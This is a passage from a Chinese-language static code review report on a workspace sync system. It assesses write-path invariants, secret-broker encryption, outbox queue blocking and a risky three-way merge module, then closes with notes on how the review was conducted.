不变量 1/2/9 看起来确实得到了强制执行。apps/web 中的每一次创作写入都经由 `dispatchWorkspaceAuthoringOperation` -> `enqueueWorkspaceOperationOutboxAndDispatch` -> 先持久化后应用 -> `executeWorkspaceOutboxOperation`。`createWorkspaceVfsIntentPlan` 甚至会在返回之前重新应用规划出的 Command 以证明其可逆性。没有任何编辑器、插件解析器或执行界面直接改动 `docsById`。后端提交(`store_operation_commit.go`)是单个 `BeginTx`,带 `FOR UPDATE` 行锁、用于强幂等的 `operation_id`+`request_hash` 重放记录,以及完整的分区化 expected-revision 前置条件检查;我追踪了 `*expected.ContentRev` / `*expected.RouteRev` 的解引用,`normalizeAndValidateCommitExpected` 确实为每个已设置的 requirement 保证非 nil(且 `Requirements.Route` 始终蕴含 `Requirements.Workspace`),因此那里不存在 nil panic。

不变量 7 在服务端构建良好 —— 带按绑定 AAD 的 KMS 信封加密、5 分钟有效的 grant、回调绑定的 `UseSecret`、对明文调用 `clear()`、`Cache-Control: private, no-store`,以及面向一次性 worker 接收方密钥的 X25519+AES-GCM 封装。唯一的缺口完全在客户端(发现 2)。两点未列为发现的次要加固提示:`IsolatedSecretBroker.Resolve` 在初始容量为 1KiB 的 `bytes.Buffer` 中构造明文,因此缓冲区扩容可能在堆上留下未清零的密钥材料副本;以及 `environment.Store.UseSecret` 仅在 `consumer` 成功之后才记录 `secret-used` 审计行,因此 consumer 出错会产生一次没有审计记录的解密。

不变量 6(运行时状态)得到了遵守:`useExecutionFilesystemChanges` 会以 `analyzeWorkspaceRuntimeFilesystemDiff` 的合格性、显式的逐项用户选择、一份资产上传计划,以及经由常规 outbox 路径的恰好一个可逆 Transaction,来把关采纳流程。

热点:`packages/workspace-sync/src/workspaceThreeWay.ts` 与 `jsonValue.ts` 这对文件是整个仓库中风险最高的。它是唯一一处对三个事实来源做协调的地方,其输出同时供给 `autoRebaseWorkspaceSnapshots`(它失败关闭,可能把 outbox 卡死)与 `adoptRebasedWorkspaceOperation`(它在写入 store 之前**不做**校验)。我的两个发现都出在这里。我建议在 `analyzeWorkspaceThreeWay` 内部对 `candidateSnapshot` 无条件加上 `validateWorkspaceSnapshot` 断言(不论冲突数量为多少),并补充跨三个 snapshot 对文档新增/删除/重排做模糊测试的属性测试。

次级风险:`failed` 状态的 outbox 队首会按设计阻塞整个因果队列(`selectWorkspaceOutboxClaimCandidate` 只认领队首,而 `isWorkspaceOutboxEntryClaimable` 排除 `failed`)。这是正确的失败关闭选择,但也意味着任何确定性的不可重试失败(发现 1)都会从丢失一个操作升级为整体同步停滞,因此 `toOutboxFailure` 中的不可重试分类值得保守处理。

次要整洁性问题:`apps/web/src/pir/{index.ts, ast/astParser.ts, converter/astToPIR.ts, schema/pir.types.ts}` 都是零字节的被跟踪文件,是 PIR 所有权迁移到 `@prodivix/pir` / `@prodivix/pir-react-renderer` 之前遗留的脚手架。它们不是缺陷,但暗示了 apps/web 中一个已不复存在的所有权边界,应予删除。

---

## 6. 备注

1. 本报告未修改任何源码,仅为静态审查记录。
2. 严重度为验证阶段修正后的值。多条原始声明的严重度被下调(例如可由用户重试恢复的授权流程缺陷从 High 降至 Medium),下调理由记录在对应条目的「验证备注」中。
3. 26 条原始声明被对抗验证驳回,未收录。常见驳回原因:调用方已有前置守卫、失败路径在生产中不可达、误读 JS/TS 或 Go 语义、引用证据与真实文件不符。
4. 第 3 节的门禁结果与依赖漏洞由确定性工具直接产出,可用 `pnpm turbo run typecheck`、`pnpm lint`、`go vet ./...`、`pnpm audit`、`node scripts/check-*.mjs` 复现。
5. 上一轮审查记录见 [`2026-07-22-static-review.md`](2026-07-22-static-review.md)。本轮为独立分区与独立验证,结论不继承上一轮。
